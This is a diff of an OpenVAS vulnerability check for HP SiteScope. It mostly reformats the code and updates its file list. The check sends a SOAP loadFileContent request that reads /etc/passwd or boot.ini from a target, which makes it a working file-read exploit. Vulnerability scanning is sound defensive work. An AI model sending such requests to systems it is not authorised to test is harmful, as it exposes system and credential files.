@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sitescope_55269.nasl 6367 2017-06-19 07:11:34Z ckuersteiner $
+# $Id: gb_sitescope_55269.nasl 11625 2018-09-26 12:08:49Z jschulte $
 #
 # HP SiteScope Multiple Security Bypass Vulnerabilities
 #
@@ -27,43 +27,46 @@
 
 CPE = "cpe:/a:hp:sitescope";
 
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.103560");
- script_cve_id("CVE-2012-3259", "CVE-2012-3260", "CVE-2012-3261", "CVE-2012-3262",
+  script_oid("1.3.6.1.4.1.25623.1.0.103560");
+  script_cve_id("CVE-2012-3259", "CVE-2012-3260", "CVE-2012-3261", "CVE-2012-3262",
                "CVE-2012-3263", "CVE-2012-3264");
- script_bugtraq_id(55269,55273);
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_version ("$Revision: 6367 $");
+  script_bugtraq_id(55269, 55273);
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_version("$Revision: 11625 $");
 
- script_name("HP SiteScope Multiple Security Bypass Vulnerabilities");
+  script_name("HP SiteScope Multiple Security Bypass Vulnerabilities");
 
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/55269");
- script_xref(name : "URL" , value : "http://www.hp.com/");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55269");
+  script_xref(name:"URL", value:"http://www.hp.com/");
 
- script_tag(name:"last_modification", value:"$Date: 2017-06-19 09:11:34 +0200 (Mon, 19 Jun 2017) $");
- script_tag(name:"creation_date", value:"2012-09-07 17:11:57 +0200 (Fri, 07 Sep 2012)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
- script_dependencies("gb_hp_sitescope_detect.nasl");
- script_mandatory_keys("hp/sitescope/installed");
- script_require_ports("Services/www", 8080);
+  script_tag(name:"last_modification", value:"$Date: 2018-09-26 14:08:49 +0200 (Wed, 26 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2012-09-07 17:11:57 +0200 (Fri, 07 Sep 2012)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
+  script_dependencies("gb_hp_sitescope_detect.nasl", "os_detection.nasl");
+  script_mandatory_keys("hp/sitescope/installed");
+  script_require_ports("Services/www", 8080);
 
- script_tag(name : "summary" , value : "HP SiteScope is prone to multiple security-bypass vulnerabilities.");
- script_tag(name : "impact" , value : "Successful exploits may allow attackers to bypass the bypass security
- restrictions and to perform unauthorized actions such as execution of
- arbitrary code in the context of the application.");
+  script_tag(name:"summary", value:"HP SiteScope is prone to multiple security-bypass vulnerabilities.");
+  script_tag(name:"impact", value:"Successful exploits may allow attackers to bypass the bypass security
+  restrictions and to perform unauthorized actions such as execution of
+  arbitrary code in the context of the application.");
+  script_tag(name:"solution", value:"Updates are available. Please contact the vendor.");
+  script_tag(name:"solution_type", value:"VendorFix");
 
- script_tag(name:"qod_type", value:"remote_app");
+  script_tag(name:"qod_type", value:"remote_app");
 
- exit(0);
+  exit(0);
 }
 
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 if (!port = get_app_port(cpe: CPE))
   exit(0);
@@ -74,11 +77,14 @@ if (!dir = get_app_location(cpe: CPE, port: port))
 if (dir == "/")
   dir = "";
 
+useragent = get_http_user_agent();
 host = http_host_name(port:port);
 
-files =  make_array("root:.*:0:[01]:","/etc/passwd","\[boot loader\]","c:\\boot.ini");
+files =  traversal_files();
 
-foreach file(keys(files)) {
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
 
   soap = string("<?xml version='1.0' encoding='UTF-8'?>\r\n",
                 "<wsns0:Envelope\r\n",
@@ -95,29 +101,25 @@ foreach file(keys(files)) {
                 "<in0\r\n",
                 "xsi:type='xsd:string'\r\n",
                 "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
-                ">",files[file],"</in0>\r\n",
+                ">",file,"</in0>\r\n",
                 "</impl:loadFileContent>\r\n",
                 "</wsns0:Body>\r\n",
                 "</wsns0:Envelope>\r\n");
-
   len = strlen(soap);
 
-  req = string("POST " + dir + "/services/APIMonitorImpl HTTP/1.1\r\n",
-               "Host: ",host,"\r\n",
-               "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
+  req = string("POST ", dir, "/services/APIMonitorImpl HTTP/1.1\r\n",
+               "Host: ", host, "\r\n",
+               "User-Agent: ", useragent, "\r\n",
                'SOAPAction: ""',"\r\n",
                "Content-Type: text/xml; charset=UTF-8\r\n",
                "Content-Length: ",len,"\r\n",
                "\r\n",
                 soap);
-
   result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-  if(eregmatch(string:result,pattern:file)) {
-
+  if(eregmatch(string:result, pattern:pattern)) {
     security_message(port:port);
-    exit(0); 
-
+    exit(0);
   }
 }
 
